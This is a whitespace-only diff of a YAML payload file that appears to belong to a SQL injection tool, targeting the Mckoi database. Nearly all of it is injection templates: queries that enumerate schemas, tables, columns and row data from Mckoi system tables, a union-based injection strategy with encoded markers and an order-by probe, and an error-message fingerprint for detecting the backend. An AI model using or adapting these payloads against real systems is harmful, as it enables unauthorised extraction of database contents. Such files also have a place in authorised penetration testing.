@@ -1,82 +1,82 @@
 vendor: Mckoi
 
-resource: 
+resource:
  info: |
-  SELECT 
+  SELECT
       '-'
       || '${enclose_value_sql}'
       || '-'
       || '${enclose_value_sql}'
       || user()
-      || '${trail_sql}' 
+      || '${trail_sql}'
       r
-      
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
        || '${trail_sql} '
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || t.s
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from 
+       from
            (select name s from SYS_INFO.sUSRSchemaInfo) t,
            (select name s from SYS_INFO.sUSRSchemaInfo) t1
        where t.s >= t1.s
        group by t.s
        ${limit}
    ) a
-   
+
   table: |
-   select 
+   select
        rr
        || '${trail_sql} '
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || t.s
-           || '${separator_qte_sql}0${enclose_value_sql}' 
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from 
+       from
            (select name s from SYS_INFO.sUSRTableInfo where "schema" = '${database}') t,
            (select name s from SYS_INFO.sUSRTableInfo where "schema" = '${database}') t1
        where t.s >= t1.s
        group by t.s
        ${limit}
    ) a
-   
+
   column: |
-   select 
+   select
        rr
        || '${trail_sql} '
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || t.s
-           || '${separator_qte_sql}0${enclose_value_sql}' 
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from 
+       from
            (select "column" s from SYS_INFO.sUSRTableColumns where "schema" = '${database}' and "table" = '${table}') t,
            (select "column" s from SYS_INFO.sUSRTableColumns where "schema" = '${database}' and "table" = '${table}') t1
        where t.s >= t1.s
        group by t.s
        ${limit}
    ) a
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
         || '${trail_sql} '
         r
     from (
-        select 
+        select
             '${enclose_value_sql}'
             || t.s
             || '${separator_qte_sql}0${enclose_value_sql}'
@@ -88,12 +88,12 @@ resource:
         group by t.s
         ${limit}
     ) a
-   fields: 
+   fields:
     field: trim(coalesce(${field.value}, ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    '${lead}'
    ||substring(
@@ -108,11 +108,11 @@ strategy:
   failsafe: select cast(x.rrr as char)rr from (select 1337${indice}7330%2b1 rrr)x
   calibrator: '%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'
   limitBoundary: 1
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - mckoi
-    
- normal: 
+
+ normal:
   indices: union all select rr from (${indice_unique})b
   capacity: "'${lead}${indice}' || ${calibrator}"
   orderBy: order by 1337
